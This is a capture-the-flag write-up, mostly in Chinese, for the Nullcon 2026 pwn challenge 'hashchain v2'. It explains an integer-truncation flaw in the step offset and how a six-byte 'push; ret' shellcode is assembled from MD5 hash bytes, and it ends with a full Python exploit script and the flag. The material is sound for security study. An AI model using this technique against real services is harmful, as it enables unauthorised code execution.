---
title: "hashchain v2 - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["shellcode", "md5", "pwn", "hashchain", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: pwn/hashchain/nullcon2026-hashchain-v2"
source:
  name: "CTFtime writeup #40551"
  url: "https://ctftime.org/writeup/40551"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "hashchain v2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** hashchain v2
- **Author team:** 正规子群.AI
- **CTFtime tags:** shellcode, md5, pwn
- **CTFtime:** <https://ctftime.org/writeup/40551>

---
## 127 hashchain v2

\- Category: `pwn`  
\- Value: `365`  
\- Solves: `46`  
\- Solved by me: `True`  
\- Local directory: `pwn/hashchain/nullcon2026-hashchain-v2`

### 题目描述  
> The easy path is gone. Build your own path to victory.  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5011`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# nullcon2026-hashchain-v2

\---  
## 题目信息  
\- 类型: Pwn  
\- 目标: `52.59.124.14:5011`  
\- 已知信息: 服务会泄露 `win()` 地址，且提示 `Executing ... hash(es) as code...`

\---  
## 初始交互与状态机  
交互流程是两步循环：  
1\. 发送一行数据，服务计算 `MD5` 并写入内部缓冲区。  
2\. 服务要求输入下一次写入步长 `Offset for next hash (min 4):`。

关键现象：  
\- 默认按 100 次后执行代码。  
\- 如果下一次写入会越界，会提前触发：`Buffer full! Executing N hash(es) as code...`。

这说明我们不必真的写满 100 次，可以构造更短链路。

\---  
## 漏洞点  
核心是步长处理存在整数截断。

服务看起来要求“最小步长 4”，但实际上存在：  
\- 先对输入做范围判断（按大整数）  
\- 后续在更新偏移时使用了 16 位截断

因此可以构造：  
\- 输入 `65537`，其低 16 位是 `1`，从而实际步长变成 `+1`

偏移可表示为：  
$offset_{i+1} = (offset_i + (step \bmod 2^{16})) \bmod 2^{16}$

这使得我们可以按字节连续铺机器码，而不是每次至少跳 4 字节。

\---  
## 利用思路  
目标是直接执行 `win()`，最短指令序列为：  
\- `push win_addr`（`0x68 + 4-byte 地址`）  
\- `ret`（`0xC3`）

即总共 6 字节：  
`68 <w0> <w1> <w2> <w3> c3`

由于每次实际写入是 `MD5(msg)` 的 16 字节，我们只控制“每个哈希块首字节”即可：  
\- 第 1 次写 offset=0，要求 `MD5(msg1)[0] = 0x68`  
\- 第 2 次写 offset=1，要求 `MD5(msg2)[0] = w0`  
\- ...  
\- 第 6 次写 offset=5，要求 `MD5(msg6)[0] = 0xC3`

每个目标只匹配 1 字节，期望复杂度约 $2^8$，很快可出。

写完第 6 次后，把下一步长设为 `2043`，使下次写入位置到 2048，随后再发一行触发 `Buffer full`，服务会执行前 6 个哈希块拼出的代码，直接跳转 `win()`。

\---  
## 失败路线记录  
1\. 一开始按 v1 思路做 4-byte 前缀暴力（例如 `push imm32` 前 4 字节），可行但不经济。   
2\. 观察 v2 的 offset 行为后，发现 `65537 -> +1` 的截断特性，转为 1-byte 前缀控制，复杂度大幅下降。   
3\. 同时利用 `Buffer full` 提前执行，将 100 步交互压缩到 6 步有效写入 + 1 步触发。

\---  
## 最终脚本  
见：`solution/[solution.py](http://solution.py)`

执行：  
```bash  
python3 solution/[solution.py](http://solution.py)  
```

\---  
## Flag  
```text  
ENO{n0_sl3d_n0_pr0bl3m_d1r3ct_h1t}  
```

### Exploit  
#### pwn/hashchain/nullcon2026-hashchain-v2/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import hashlib  
import re  
import socket  
import time

HOST = "52.59.124.14"  
PORT = 5011

def recv_until(sock, tokens=(b"> ", b": "), timeout=2.0):  
out = b""  
end = time.time() + timeout  
sock.settimeout(0.4)  
while time.time() < end:  
try:  
d = sock.recv(4096)  
if not d:  
return out, False  
out += d  
if any(out.endswith(t) for t in tokens):  
return out, True  
except socket.timeout:  
pass  
return out, True

def find_msg_for_first_byte(target_byte):  
i = 0  
while True:  
msg = f"M{target_byte:02x}_{i}".encode()  
d = hashlib.md5(msg).digest()  
if d[0] == target_byte:  
return msg  
i += 1

def solve():  
s = socket.create_connection((HOST, PORT), timeout=8)  
try:  
banner, ok = recv_until(s, tokens=(b"> ",), timeout=3.0)  
if not ok:  
raise RuntimeError("failed to receive initial banner")

m = re.search(rb"win\\(\\) is at (0x[0-9a-fA-F]+)", banner)  
if not m:  
raise RuntimeError("failed to parse win() address")

win_addr = int(m.group(1), 16)  
win_le = win_addr.to_bytes(4, "little")

# push win_addr ; ret  
targets = [0x68, win_le[0], win_le[1], win_le[2], win_le[3], 0xC3]  
payload_lines = [find_msg_for_first_byte(b) for b in targets]

for idx, line in enumerate(payload_lines, 1):  
s.sendall(line + b"\n")  
_, ok = recv_until(s, tokens=(b": ", b"> "), timeout=2.0)  
if not ok:  
raise RuntimeError(f"connection closed after hash #{idx}")

step = 65537 if idx < 6 else 2043  
s.sendall(str(step).encode() + b"\n")  
_, ok2 = recv_until(s, tokens=(b"> ",), timeout=2.0)  
if not ok2:  
raise RuntimeError(f"connection closed after step #{idx}")

s.sendall(b"TRIGGER\n")  
out = b""  
end = time.time() + 2.5  
s.settimeout(0.4)  
while time.time() < end:  
try:  
d = s.recv(4096)  
if not d:  
break  
out += d  
except socket.timeout:  
pass

mflag = re.search(rb"ENO\\{[^\r\n}]*\\}", out)  
if not mflag:  
raise RuntimeError("flag not found")  
return mflag.group(0).decode()  
finally:  
s.close()

if __name__ == "__main__":  
print(solve())  
```

\---
